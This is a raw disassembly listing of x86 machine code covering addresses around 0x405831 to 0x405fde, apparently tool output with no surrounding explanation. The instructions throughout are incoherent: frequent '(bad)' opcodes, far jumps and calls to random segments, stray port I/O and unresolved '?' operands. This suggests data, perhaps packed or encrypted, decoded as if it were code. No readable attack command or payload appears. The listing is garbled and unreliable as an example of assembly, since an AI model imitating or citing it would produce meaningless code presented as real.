  405831:	cmp    DWORD PTR [eax-0x20cefe31],ebx
  405837:	(bad)  
  405838:	shl    BYTE PTR [esi-0x6dd96312],1
  40583e:	nop
  40583f:	dec    ecx
  405840:	push   0xffffffb3
  405842:	fnstcw WORD PTR [eax+0x1f]
  405845:	mov    ecx,0x715d96fb
  40584a:	inc    ebx
  40584b:	out    0xb,al
  40584d:	jmp    0xa859:0xa4057e6d
  405854:	in     eax,0x99
  405856:	gs jmp 0x79f260a3
  40585c:	jnp    0x4057fb
  40585e:	sub    al,dh
  405860:	xchg   DWORD PTR [edx+0x4f],edx
  405863:	jb     0x405899
  405865:	sbb    eax,0x341dd973
  40586a:	loope  0x40589b
  40586c:	enter  0x469e,0xf7
  405870:	cmp    edi,ecx
  405872:	jmp    0x6a00d23b
  405877:	cmp    al,0x43
  405879:	arpl   WORD PTR [ebx+0x2f],cx
  40587c:	mov    eax,0xfcdbab6f
  405881:	or     BYTE PTR [ebx],0xb0
  405884:	xchg   edi,eax
  405885:	or     BYTE PTR [ebx-0x5fb5bb2d],dl
  40588b:	pop    esp
  40588d:	stos   BYTE PTR es:[edi],al
  40588e:	mov    dl,BYTE PTR [edx-0x43]
  405891:	dec    ebp
  405892:	lahf   
  405893:	inc    ecx
  405894:	and    BYTE PTR ds:0x489e3b7c,cl
  40589a:	pop    esi
  40589b:	and    ebp,DWORD PTR [ebx+0x5104ff1]
  4058a1:	xchg   edx,eax
  4058a2:	js     0x4058f5
  4058a4:	push   es
  4058a5:	repnz bound esp,QWORD PTR [ebp-0xf4ed44e]
  4058ac:	xor    al,0xee
  4058ae:	cmp    DWORD PTR [edx+eiz*4-0x60a3c6cf],ebp
  4058b5:	jo     0x40590c
  4058b7:	dec    ebp
  4058b8:	add    al,0x1d
  4058ba:	push   edx
  4058bb:	pop    esp
  4058bc:	dec    eax
  4058bd:	push   ecx
  4058be:	js     0x40589c
  4058c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4058c1:	push   edi
  4058c2:	fwait
  4058c3:	mov    ds:0x4cff6365,al
  4058c8:	test   BYTE PTR [edi],bl
  4058ca:	jnp    0x40584f
  4058cc:	ret    0xc886
  4058cf:	mov    edx,0x3247fa97
  4058d4:	ret    0x309b
  4058d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058d8:	pop    esp
  4058d9:	scas   al,BYTE PTR es:[edi]
  4058da:	sbb    BYTE PTR [edx+0x2d],0x5d
  4058de:	mov    ds,WORD PTR [ebx-0x51]
  4058e1:	push   0x5e
  4058e3:	cdq    
  4058e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e5:	adc    ch,dl
  4058e7:	shr    DWORD PTR ds:0x92858bae,0xc9
  4058ee:	(bad)  
  4058ef:	push   edi
  4058f0:	pop    ds
  4058f1:	cld    
  4058f2:	and    BYTE PTR [ebx+0x50],al
  4058f5:	mov    DWORD PTR [edi+0xf68d22],edx
  4058fb:	fstp   TBYTE PTR [edx-0x9204d9e]
  405901:	add    edx,DWORD PTR [ebx-0x4533281d]
  405907:	mov    ah,0x17
  405909:	mov    cl,BYTE PTR es:[edi-0x55]
  40590d:	cmp    DWORD PTR ds:0xd3156f2e,esp
  405913:	aas    
  405914:	jo     0x4058ea
  405916:	fild   WORD PTR [eax+0x496a5086]
  40591c:	dec    edx
  40591d:	fiadd  DWORD PTR [ebx-0x76]
  405920:	push   esp
  405921:	jle    0x4058af
  405923:	pop    eax
  405924:	push   edi
  405925:	mov    eax,0xd8dad4ea
  40592a:	fsubr  DWORD PTR [edi-0x6e]
  40592d:	cmp    eax,0x4c6328fa
  405932:	ins    BYTE PTR es:[edi],dx
  405933:	mov    esi,0x129ba689
  405938:	jns    0x405938
  40593a:	(bad)  
  40593b:	rcr    BYTE PTR [ebx-0x37],cl
  40593e:	fist   WORD PTR [eax+0x59f87d7e]
  405944:	(bad)  
  405945:	cld    
  405946:	(bad)  
  405947:	xor    al,BYTE PTR [edi+0x56bbb8cd]
  40594d:	add    bl,BYTE PTR ds:0x99ecefef
  405953:	repnz cmp BYTE PTR [esi-0x775b3cc6],bh
  40595a:	jge    0x40599f
  40595c:	sub    ebp,esi
  40595e:	mov    eax,ds:0xeea4fcdd
  405963:	js     0x4059bc
  405965:	nop
  405966:	sbb    al,0x6c
  405968:	shl    DWORD PTR [ebx],1
  40596a:	fld    TBYTE PTR [eax]
  40596c:	jle    0x40590d
  40596e:	push   0xffffffe4
  405970:	jmp    0x405923
  405972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405973:	aad    0xe6
  405975:	imul   esi,esp,0x7c166591
  40597b:	push   ecx
  40597c:	or     al,0xbf
  40597e:	pop    esi
  40597f:	add    ch,BYTE PTR ds:0x9dd715fb
  405985:	mov    ds:0xaa7ed931,eax
  40598a:	and    dl,BYTE PTR [ebp-0x51650556]
  405990:	loop   0x4059ef
  405992:	sbb    dl,bh
  405994:	add    DWORD PTR [esi-0x71],0x50ce54d5
  40599b:	das    
  40599c:	inc    ebp
  40599d:	bound  ecx,QWORD PTR [ebx+0x15]
  4059a0:	mov    ah,0xc2
  4059a2:	mov    dl,0x66
  4059a4:	push   esi
  4059a5:	push   ebx
  4059a6:	pusha  
  4059a7:	mov    ebx,DWORD PTR [eax-0x6a]
  4059aa:	add    al,0x9b
  4059ac:	sbb    al,BYTE PTR [esp+ecx*1+0x72adf01f]
  4059b3:	pop    eax
  4059b4:	mov    edx,?
  4059b6:	mov    eax,0xdeda943f
  4059bb:	mov    ebx,edi
  4059bd:	mov    al,ds:0x6075b3b7
  4059c2:	addr16 inc ebx
  4059c4:	jmp    0x405a16
  4059c6:	(bad)  
  4059c7:	inc    ebx
  4059c8:	cmp    DWORD PTR [eax-0x12],ecx
  4059cb:	mov    esi,?
  4059cd:	push   edi
  4059ce:	xor    cl,BYTE PTR [ebx]
  4059d0:	pop    esi
  4059d1:	jmp    0x4e6d:0x8a15ff22
  4059d8:	and    DWORD PTR [ebp-0x5912bf0],eax
  4059de:	mov    ds:0xafa834db,al
  4059e3:	or     DWORD PTR [edi],edi
  4059e5:	dec    ebp
  4059e6:	test   DWORD PTR [edx],edi
  4059e8:	lahf   
  4059e9:	shl    ch,1
  4059eb:	test   ch,bl
  4059ed:	outs   dx,BYTE PTR ds:[esi]
  4059ee:	ffree  st(4)
  4059f0:	pop    edx
  4059f1:	leave  
  4059f2:	mov    edi,0x805d7d22
  4059f7:	loopne 0x405a33
  4059f9:	push   ebp
  4059fa:	xor    al,ch
  4059fc:	sbb    DWORD PTR [ebx],esi
  4059fe:	xchg   edx,eax
  4059ff:	outs   dx,BYTE PTR ds:[esi]
  405a00:	jo     0x405a7a
  405a02:	push   ecx
  405a03:	mov    al,ds:0xbe5d1a2c
  405a08:	pop    eax
  405a09:	lea    ecx,[ebx-0x66]
  405a0c:	pop    ebp
  405a0d:	pushf  
  405a0e:	ins    DWORD PTR es:[edi],dx
  405a0f:	cmp    al,0xbb
  405a11:	out    0xd4,al
  405a13:	ficom  DWORD PTR [edi+edi*2]
  405a16:	adc    bh,BYTE PTR [esi]
  405a18:	xor    edx,DWORD PTR [ecx]
  405a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a1b:	dec    esi
  405a1c:	cs (bad) 
  405a1e:	inc    ebx
  405a1f:	je     0x405a7f
  405a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a22:	pop    edi
  405a23:	dec    eax
  405a24:	and    al,0x93
  405a26:	fwait
  405a27:	mov    ah,0x77
  405a29:	into   
  405a2a:	push   ebp
  405a2b:	push   es
  405a2c:	mov    cl,0xea
  405a2e:	adc    BYTE PTR [esi],0x37
  405a31:	jl     0x405aae
  405a33:	test   eax,0x54478125
  405a38:	adc    esi,DWORD PTR [ebx-0x4a]
  405a3b:	jb     0x405a9d
  405a3d:	std    
  405a3e:	hlt    
  405a3f:	inc    esi
  405a40:	xchg   esp,eax
  405a41:	fsubr  QWORD PTR [ebx-0x7cfb6530]
  405a47:	dec    edi
  405a48:	xchg   edx,eax
  405a49:	mov    eax,ds:0x60684610
  405a4e:	sbb    BYTE PTR [edx+0x37735871],bh
  405a54:	add    DWORD PTR [edx-0x54664baa],eax
  405a5a:	xor    al,0x9f
  405a5c:	mov    al,ds:0x5e6bb4bc
  405a61:	mov    ebp,0x69cc0bc8
  405a66:	and    ecx,DWORD PTR [esi+0x2bf5f672]
  405a6c:	les    esp,FWORD PTR [ebx+edi*1+0x1e]
  405a70:	pop    edx
  405a71:	pushf  
  405a72:	outs   dx,BYTE PTR ds:[esi]
  405a73:	xlat   BYTE PTR ds:[ebx]
  405a74:	lods   al,BYTE PTR ds:[esi]
  405a75:	lock mov BYTE PTR [eax],al
  405a78:	adc    BYTE PTR [esi-0x2e24a346],0xeb
  405a7f:	inc    esp
  405a80:	sbb    edi,eax
  405a82:	pop    eax
  405a83:	jge    0x405ac9
  405a85:	inc    edi
  405a86:	test   BYTE PTR [ebp-0x7d9bc4de],dl
  405a8c:	in     eax,0xc3
  405a8e:	sbb    al,0xd6
  405a90:	mov    BYTE PTR [ebp-0xdac87cc],ah
  405a96:	imul   ebx,DWORD PTR [edi+0x7a],0xde6bcf4e
  405a9d:	push   0xffffff81
  405a9f:	inc    eax
  405aa0:	and    al,BYTE PTR [ecx-0x5851833]
  405aa6:	or     ah,BYTE PTR [eax-0x4b]
  405aa9:	mov    esp,0xc0551406
  405aae:	call   DWORD PTR [ecx]
  405ab0:	rol    DWORD PTR [edx+0x4e],1
  405ab3:	jbe    0x405b10
  405ab5:	sub    dh,ch
  405ab7:	clc    
  405ab8:	lds    edx,FWORD PTR [eax]
  405aba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405abb:	test   DWORD PTR [ebx+0x2f],ebx
  405abe:	dec    esp
  405abf:	lds    esi,FWORD PTR [ebx+eiz*4+0x216af505]
  405ac6:	xchg   edi,eax
  405ac7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ac8:	xchg   DWORD PTR [eax+0x25b1aef6],ebp
  405ace:	(bad)  
  405ad0:	test   al,0xa1
  405ad2:	adc    dh,BYTE PTR [ecx+esi*2]
  405ad5:	fisttp WORD PTR [ebp-0x5d]
  405ad8:	inc    ecx
  405ad9:	cwde   
  405ada:	cmc    
  405adb:	jl     0x405af9
  405add:	retf   0xe8bd
  405ae0:	fwait
  405ae1:	push   esp
  405ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ae3:	jecxz  0x405ade
  405ae5:	jno    0x405a6d
  405ae7:	cdq    
  405ae8:	test   eax,0xe33e8319
  405aed:	and    edx,DWORD PTR [esi+0x62cd543e]
  405af3:	cmp    al,0xda
  405af5:	iret   
  405af6:	js     0x405a93
  405af8:	cmp    al,0xb0
  405afa:	popa   
  405afb:	pop    edi
  405afc:	cmp    cl,BYTE PTR [ebx-0x2a01814a]
  405b02:	and    al,BYTE PTR [ebp+0x6317acf4]
  405b08:	mov    esi,DWORD PTR [edi]
  405b0a:	ins    DWORD PTR es:[edi],dx
  405b0b:	jae    0x405aed
  405b0d:	clc    
  405b0e:	call   0x106e86e0
  405b13:	cmc    
  405b14:	test   al,dl
  405b16:	std    
  405b17:	rol    BYTE PTR [ecx+0x16dbf64a],0x47
  405b1e:	lods   eax,DWORD PTR ds:[esi]
  405b1f:	sti    
  405b20:	mov    eax,0xac05e1ec
  405b25:	adc    al,0xc4
  405b27:	or     al,0x4
  405b29:	loopne 0x405b23
  405b2b:	das    
  405b2c:	sbb    ebx,edx
  405b2e:	dec    ebp
  405b2f:	adc    bl,bh
  405b31:	mov    ch,0x4d
  405b33:	pcmpgtd mm7,QWORD PTR [esi+0x4a]
  405b37:	out    0x7,al
  405b39:	in     eax,0xe2
  405b3b:	and    dl,0x30
  405b3e:	and    ch,BYTE PTR [edx-0x69]
  405b41:	jl     0x405b4e
  405b43:	adc    ecx,DWORD PTR [eax-0x2e82d6b9]
  405b49:	push   esp
  405b4a:	pop    ecx
  405b4b:	mov    esp,0xffa1f20
  405b50:	xor    ah,BYTE PTR [esp+edx*8]
  405b53:	loope  0x405ad9
  405b55:	mov    edx,0x247f7197
  405b5a:	aam    0x1a
  405b5c:	cmp    eax,0x96f7ec3
  405b61:	fldenv ds:0xd17e875e
  405b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b68:	adc    esp,ecx
  405b6a:	cdq    
  405b6b:	adc    al,0x28
  405b6d:	sbb    ebx,DWORD PTR [ebx-0xa]
  405b70:	adc    ebp,ebx
  405b72:	xchg   ecx,eax
  405b73:	dec    esp
  405b74:	mov    ds:0x9235eebd,al
  405b79:	aas    
  405b7a:	rcr    eax,0x4
  405b7d:	jp     0x405b91
  405b7f:	mov    eax,ds:0x1aae9601
  405b84:	adc    ebx,DWORD PTR [edi+0x7b]
  405b87:	jo     0x405c05
  405b89:	mov    ah,0xa1
  405b8b:	inc    ebx
  405b8c:	jmp    0x6ad9:0x1b0c1ab7
  405b93:	pop    ds
  405b94:	xchg   ecx,eax
  405b95:	fabs   
  405b97:	mov    ebx,0x3582ade6
  405b9c:	or     al,0x9b
  405b9e:	test   al,0x74
  405ba0:	mov    esi,0xd4a720aa
  405ba5:	rcr    DWORD PTR [eax],0x30
  405ba8:	aaa    
  405ba9:	xchg   ebp,eax
  405baa:	mov    dl,0xe5
  405bac:	mov    al,ds:0xae9dd0ce
  405bb1:	sub    eax,0xf13e9778
  405bb6:	sar    esi,cl
  405bb8:	aaa    
  405bb9:	ffreep st(7)
  405bbb:	test   al,0xab
  405bbd:	xor    al,0x58
  405bbf:	cs call 0x1809d157
  405bc5:	push   esp
  405bc6:	mov    edi,DWORD PTR [edi]
  405bc8:	mov    bl,0x17
  405bca:	inc    ecx
  405bcb:	mov    ecx,DWORD PTR [edi+0x77]
  405bce:	das    
  405bcf:	cs add dl,ch
  405bd2:	ja     0x405b6c
  405bd4:	call   0x5edc:0x3ab75344
  405bdb:	cmp    edi,DWORD PTR [esi+0x42]
  405bde:	int    0xde
  405be0:	sahf   
  405be1:	mov    eax,ds:0xdc013a0c
  405be6:	xrelease xchg BYTE PTR [esp+eiz*8],dh
  405bea:	inc    edi
  405beb:	push   ds
  405bec:	imul   ecx,DWORD PTR [ecx+0xace6237],0x6cc9d310
  405bf6:	shl    BYTE PTR ss:[ebx],0x66
  405bfa:	pop    edx
  405bfb:	push   ebx
  405bfc:	cmp    al,0x69
  405bfe:	std    
  405bff:	adc    bl,BYTE PTR [eax+eax*2]
  405c02:	les    edi,FWORD PTR [ecx-0x2e]
  405c05:	push   es
  405c06:	inc    dh
  405c08:	cmp    DWORD PTR [edx-0x1c1d13b0],ecx
  405c0e:	ja     0x405b92
  405c10:	rol    DWORD PTR [ebx],1
  405c12:	and    DWORD PTR [eax+esi*1-0x26],esi
  405c16:	loopne 0x405c24
  405c18:	test   bl,0xa
  405c1b:	mov    WORD PTR [eax],?
  405c1d:	call   0xbbeb:0xc399907f
  405c24:	pop    ebp
  405c25:	imul   ebx,DWORD PTR [eax+0x3a544d58],0xde43a0cb
  405c2f:	push   es
  405c30:	stos   BYTE PTR es:[edi],al
  405c31:	jb     0x405c78
  405c33:	sub    eax,0x2872c281
  405c38:	loope  0x405c97
  405c3a:	push   cs
  405c3b:	mov    edi,0xe61ef2e1
  405c40:	mov    WORD PTR [ecx+0x41],cs
  405c43:	mov    edx,0x565ce049
  405c48:	sub    al,0x5a
  405c4a:	hlt    
  405c4b:	addr16 dec ebx
  405c4d:	pop    edx
  405c4e:	scas   eax,DWORD PTR es:[edi]
  405c4f:	mov    al,ds:0x954da71d
  405c54:	push   edi
  405c55:	retf   
  405c56:	or     BYTE PTR [edx],bl
  405c58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c59:	in     eax,0xf0
  405c5b:	and    al,0xe0
  405c5d:	aaa    
  405c5e:	test   BYTE PTR [ebp+0x6a],al
  405c61:	xchg   BYTE PTR [esi+0x1d],cl
  405c64:	and    ecx,0xeb5f6b17
  405c6a:	and    BYTE PTR ds:[ecx],cl
  405c6d:	rcl    BYTE PTR [esi+0x10a301b3],cl
  405c73:	jmp    0x37b2d4d4
  405c78:	inc    esp
  405c79:	adc    BYTE PTR [edi+edx*1],bh
  405c7c:	in     al,0xfd
  405c7e:	fnsetpm(287 only) 
  405c80:	cli    
  405c81:	xchg   ebp,eax
  405c82:	(bad)  
  405c83:	xchg   ebp,eax
  405c84:	std    
  405c85:	cmp    DWORD PTR [ebx-0x6f876bcd],ecx
  405c8b:	push   edi
  405c8c:	inc    eax
  405c8d:	jb     0x405cd9
  405c8f:	dec    edi
  405c90:	or     BYTE PTR [edx-0x25be904f],bh
  405c96:	dec    eax
  405c97:	dec    esp
  405c98:	fimul  DWORD PTR [edi+0x5d]
  405c9b:	outs   dx,BYTE PTR ds:[esi]
  405c9c:	sti    
  405c9d:	add    BYTE PTR [ecx+0x5e],cl
  405ca0:	or     eax,0xabb19ee8
  405ca5:	aaa    
  405ca6:	cli    
  405ca7:	ds jno 0x405c5e
  405caa:	call   0xc1b3d851
  405caf:	sar    ebx,0x31
  405cb2:	or     eax,0x206a01d5
  405cb7:	xchg   ecx,eax
  405cb8:	mov    dl,0x85
  405cba:	xchg   ecx,eax
  405cbb:	adc    ecx,esi
  405cbd:	jmp    0x405cdc
  405cbf:	(bad)  
  405cc1:	adc    BYTE PTR [ebp-0x50],bh
  405cc4:	lods   eax,DWORD PTR ds:[esi]
  405cc5:	push   esp
  405cc6:	lea    ebp,[eax+0x10599d8]
  405ccc:	lods   eax,DWORD PTR ds:[esi]
  405ccd:	ins    BYTE PTR es:[edi],dx
  405cce:	adc    DWORD PTR [edi-0x8],0x64f108a1
  405cd5:	jo     0x405cdd
  405cd7:	mov    ss:0x252e5e34,al
  405cdd:	fstp   DWORD PTR [ebx-0x7406e600]
  405ce3:	daa    
  405ce4:	inc    ecx
  405ce5:	leave  
  405ce6:	daa    
  405ce7:	jns    0x405cc9
  405ce9:	pop    ecx
  405cea:	inc    edx
  405ceb:	mov    ecx,0x51ae533a
  405cf0:	fwait
  405cf1:	lea    edi,[edx-0x5d762141]
  405cf7:	repnz bound ebx,QWORD PTR [esi-0x35]
  405cfb:	xor    ah,BYTE PTR [edx+0x23b2552b]
  405d01:	cdq    
  405d02:	jae    0x405ccc
  405d04:	mov    eax,0xabf5f1cf
  405d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d0a:	xlat   BYTE PTR ds:[ebx]
  405d0b:	xchg   BYTE PTR [ebx+ebx*4-0x45],bh
  405d0f:	mov    edi,ecx
  405d11:	mov    ch,0xb4
  405d13:	jno    0x405d13
  405d15:	shl    DWORD PTR [ecx],1
  405d17:	or     al,0xec
  405d19:	xor    DWORD PTR ds:0xe021a73b,edi
  405d1f:	jmp    0x405d20
  405d21:	(bad)  
  405d22:	into   
  405d23:	retf   0xea7b
  405d26:	fld    TBYTE PTR [eax+esi*2-0x236c3cca]
  405d2d:	daa    
  405d2e:	and    al,0x32
  405d30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d31:	rcl    DWORD PTR [esp+eiz*8-0x58],0xd8
  405d36:	mov    ecx,0x1126be09
  405d3b:	inc    esp
  405d3c:	push   ss
  405d3d:	in     al,dx
  405d3e:	sbb    eax,0xfe38227b
  405d43:	push   edx
  405d44:	sub    eax,0xda7c6233
  405d49:	cmp    al,0xb7
  405d4b:	xchg   ecx,eax
  405d4c:	sti    
  405d4d:	mov    ?,edx
  405d4f:	in     al,0x2a
  405d51:	xor    al,BYTE PTR [esi-0xb]
  405d54:	adc    bl,dl
  405d56:	dec    ebp
  405d57:	jge    0x405da5
  405d59:	scas   eax,DWORD PTR es:[edi]
  405d5a:	push   edx
  405d5b:	inc    ecx
  405d5c:	inc    esi
  405d5d:	test   BYTE PTR [ecx],bh
  405d5f:	sub    DWORD PTR [ebx+0x4f1b8093],ecx
  405d65:	daa    
  405d66:	test   eax,0xcb5a32fe
  405d6b:	mov    ch,0x7c
  405d6d:	xor    eax,0x3b2d7172
  405d72:	lods   eax,DWORD PTR ds:[esi]
  405d73:	mov    cl,0xc0
  405d75:	dec    ecx
  405d76:	ret    
  405d77:	mov    eax,0xe01f96
  405d7c:	sub    edx,DWORD PTR [ebp-0x79324aa9]
  405d82:	sti    
  405d83:	cmp    al,0x6
  405d85:	cld    
  405d86:	ret    
  405d87:	xor    al,0xb1
  405d89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d8a:	jnp    0x405d59
  405d8c:	cwde   
  405d8d:	jecxz  0x405d38
  405d8f:	sub    DWORD PTR [esi],esp
  405d91:	fmulp  st(4),st
  405d93:	add    eax,0xa593efa
  405d98:	cmp    bl,ch
  405d9a:	xchg   esp,eax
  405d9b:	les    edi,FWORD PTR [eax-0x8]
  405d9e:	jmp    0x1449:0xedc6fcd5
  405da5:	test   eax,0xf5434fb
  405daa:	mov    ch,0x7f
  405dac:	pushf  
  405dad:	mov    edi,0xfaf6517f
  405db3:	push   esp
  405db4:	stos   DWORD PTR es:[edi],eax
  405db5:	int    0xd4
  405db7:	(bad)  
  405db8:	scas   eax,DWORD PTR es:[edi]
  405db9:	mov    ch,0xb
  405dbb:	mov    al,BYTE PTR [edi+ebp*8-0x54]
  405dbf:	cmp    al,0x91
  405dc1:	push   es
  405dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dc3:	lods   eax,DWORD PTR ds:[esi]
  405dc4:	add    al,bl
  405dc6:	das    
  405dc7:	xor    eax,0xd3f153df
  405dcc:	mov    esi,ebx
  405dce:	pop    ecx
  405dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405dd0:	mov    edx,DWORD PTR [ebx+edi*2-0x42e7af8e]
  405dd7:	mov    eax,ds:0x6a11651c
  405ddc:	cs stos DWORD PTR es:[edi],eax
  405dde:	std    
  405ddf:	push   ss
  405de0:	popf   
  405de1:	sbb    DWORD PTR [edx],ecx
  405de3:	sub    edi,eax
  405de5:	mov    ecx,DWORD PTR [ebx]
  405de7:	mov    ebp,0xee93214a
  405dec:	iret   
  405ded:	mov    al,ds:0x9db14189
  405df2:	hlt    
  405df3:	jmp    0x405dac
  405df5:	xor    esi,eax
  405df7:	lods   eax,DWORD PTR ds:[esi]
  405df8:	pop    edi
  405df9:	or     bl,BYTE PTR [edx]
  405dfb:	push   ecx
  405dfc:	add    BYTE PTR [edi+0x794b6f5a],dl
  405e02:	repz inc ebp
  405e04:	inc    eax
  405e05:	sbb    BYTE PTR [ebp+0x3d],ch
  405e08:	xchg   BYTE PTR [esi],cl
  405e0a:	fs dec eax
  405e0c:	iret   
  405e0d:	neg    bl
  405e0f:	(bad)  
  405e11:	push   edx
  405e12:	jmp    0x7f1e:0xaf4a842f
  405e19:	test   al,0x55
  405e1b:	jmp    0x405e07
  405e1d:	pop    esp
  405e1e:	sub    al,0xc8
  405e20:	mov    al,ds:0x8e468594
  405e25:	or     dh,BYTE PTR [edi+0x5a8697f3]
  405e2b:	push   0xb7cec10d
  405e30:	ins    DWORD PTR es:[edi],dx
  405e31:	outs   dx,BYTE PTR ds:[esi]
  405e32:	mov    eax,ds:0xf35f64a6
  405e37:	aam    0xb8
  405e39:	es out 0xe9,al
  405e3c:	scas   al,BYTE PTR es:[edi]
  405e3d:	out    dx,al
  405e3e:	retf   0xb2b0
  405e41:	inc    esi
  405e42:	sub    BYTE PTR [ebx+0x283c27dc],al
  405e48:	imul   ecx,DWORD PTR [ebx-0x36],0x3768565c
  405e4f:	pop    ecx
  405e50:	pop    edi
  405e51:	daa    
  405e52:	xor    DWORD PTR [edi+ebp*2+0x7e6dfbdb],esp
  405e59:	xor    eax,0xebfa1788
  405e5e:	mov    eax,ds:0x269190dd
  405e63:	and    al,0x4d
  405e65:	enter  0x9ed6,0x9f
  405e69:	mov    ah,0xc4
  405e6b:	ins    DWORD PTR es:[edi],dx
  405e6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e6d:	in     al,0x99
  405e6f:	jecxz  0x405e11
  405e71:	push   es
  405e72:	jmp    0x15e3:0x7b46cd64
  405e79:	mov    eax,ds:0x5eb7c58b
  405e7e:	push   edi
  405e7f:	push   ecx
  405e80:	push   ss
  405e81:	xchg   esi,ebx
  405e83:	loopne 0x405e3a
  405e85:	jl     0x405ede
  405e87:	imul   di,WORD PTR [esi+0x76265a7b],0x40
  405e8f:	xchg   ebp,eax
  405e90:	and    eax,0xf9942cf
  405e95:	xor    DWORD PTR [eax+0x50e49cf7],ecx
  405e9b:	test   BYTE PTR [ebp+ecx*1+0xbb38b2d],cl
  405ea2:	sub    BYTE PTR [ebx],ch
  405ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ea5:	imul   esi
  405ea7:	add    eax,DWORD PTR ds:0xc0280445
  405ead:	push   ecx
  405eae:	(bad)  
  405eaf:	mov    ah,dl
  405eb1:	xlat   BYTE PTR ds:[ebx]
  405eb2:	xchg   ebp,eax
  405eb3:	jge    0x405f1e
  405eb5:	adc    edx,DWORD PTR [ebp-0x77377e9]
  405ebb:	in     eax,0x9c
  405ebd:	sbb    al,ah
  405ebf:	jg     0x405e5f
  405ec1:	mov    ebp,0xaa35369a
  405ec6:	jnp    0x405f40
  405ec8:	stos   DWORD PTR es:[edi],eax
  405ec9:	into   
  405eca:	jl     0x405f24
  405ecc:	stos   BYTE PTR es:[edi],al
  405ecd:	xor    ebx,ebx
  405ecf:	or     ch,BYTE PTR [ebx]
  405ed1:	dec    esp
  405ed2:	jmp    0x405e71
  405ed4:	cmp    eax,eax
  405ed6:	xchg   ecx,eax
  405ed7:	lods   eax,DWORD PTR ds:[esi]
  405ed8:	xor    cl,BYTE PTR [ebx+esi*2]
  405edb:	cmp    DWORD PTR [ecx+0x72],esp
  405ede:	cld    
  405edf:	mov    al,BYTE PTR [esp+ebp*2-0x69]
  405ee3:	xchg   ecx,eax
  405ee4:	jmp    0x497f:0xb62b26a6
  405eeb:	sub    dh,bh
  405eed:	std    
  405eee:	mov    bl,BYTE PTR [eax-0x630b660]
  405ef4:	jg     0x405f3b
  405ef6:	push   0x41
  405ef8:	stos   BYTE PTR es:[edi],al
  405ef9:	pop    ecx
  405efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405efb:	fiadd  DWORD PTR [ecx+0x38]
  405efe:	dec    ebx
  405eff:	aaa    
  405f00:	adc    DWORD PTR [ebx-0x10058a77],0x7e
  405f07:	jne    0x405f63
  405f09:	mov    cl,0x51
  405f0b:	sbb    BYTE PTR [ebx],ch
  405f0d:	arpl   WORD PTR [esi+0x47cf965c],bx
  405f13:	out    0xc9,al
  405f15:	adc    al,0xb5
  405f17:	cmp    esi,edi
  405f19:	aas    
  405f1a:	push   ds
  405f1b:	dec    ebx
  405f1c:	mov    dl,0xb7
  405f1e:	test   eax,0x5706da89
  405f23:	jmp    0xcaa2:0xcf435bd6
  405f2a:	mov    ebx,0xa69fb6dc
  405f2f:	out    dx,al
  405f30:	pop    edi
  405f31:	mov    esp,ebp
  405f33:	xor    bh,ch
  405f35:	call   0xdd40:0xd139cd2f
  405f3c:	imul   eax,DWORD PTR [ecx-0x1d],0x19
  405f40:	aad    0x77
  405f42:	cmp    al,0x7a
  405f44:	in     eax,dx
  405f45:	sub    ah,BYTE PTR [ebp-0x39]
  405f48:	es int 0x56
  405f4b:	call   0x73ddd9f4
  405f50:	sbb    BYTE PTR [ebx+edi*2],0xdb
  405f54:	and    esp,DWORD PTR [esi+0x33]
  405f57:	aaa    
  405f58:	add    DWORD PTR [ebx-0x1dd8365],ecx
  405f5e:	push   ebp
  405f5f:	jb     0x405fdc
  405f61:	pop    edx
  405f62:	dec    esp
  405f63:	mov    esi,0x58f622d1
  405f68:	test   ebx,ebp
  405f6a:	cmp    cl,BYTE PTR [esi+0x35]
  405f6d:	sbb    DWORD PTR [ebx-0x56dbe83c],esi
  405f73:	pop    eax
  405f74:	or     dl,bh
  405f76:	inc    ebp
  405f77:	leave  
  405f78:	out    dx,al
  405f79:	into   
  405f7a:	cmp    ebp,ebx
  405f7c:	sub    al,0x3e
  405f7e:	les    esp,FWORD PTR [ebx+0x17]
  405f81:	add    edx,DWORD PTR [ecx+esi*2+0x5b28cb10]
  405f88:	mov    WORD PTR [edx+0x30f69806],cs
  405f8e:	adc    al,0x3
  405f90:	ins    BYTE PTR es:[edi],dx
  405f91:	adc    esi,DWORD PTR [ebx]
  405f93:	inc    ebx
  405f94:	aaa    
  405f95:	sub    al,0x84
  405f97:	(bad)  
  405f98:	xchg   ecx,eax
  405f99:	shl    edx,cl
  405f9b:	call   0x656a:0x56b68f36
  405fa2:	jle    0x405fa3
  405fa4:	mov    dh,0x33
  405fa6:	fwait
  405fa7:	out    dx,eax
  405fa8:	pushf  
  405fa9:	inc    ebx
  405faa:	jmp    0x9bf5:0x27a688f9
  405fb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fb2:	mov    esi,0x4a9884b6
  405fb7:	pop    edx
  405fb8:	(bad)  
  405fb9:	test   BYTE PTR [eax+0x6a6f68a6],0xbc
  405fc0:	arpl   WORD PTR [ebp-0x28],si
  405fc3:	shl    BYTE PTR [ecx+0x55a3201d],1
  405fc9:	cmp    eax,DWORD PTR [eax]
  405fcb:	sub    ebp,0x652d6b04
  405fd1:	icebp  
  405fd2:	(bad)  
  405fd4:	pop    ebp
  405fd5:	fild   DWORD PTR [edi+0x7a]
  405fd8:	inc    ecx
  405fd9:	lods   eax,DWORD PTR ds:[esi]
  405fda:	cmp    al,0x76
  405fdc:	mov    ah,0x0
  405fde:	pop    esp
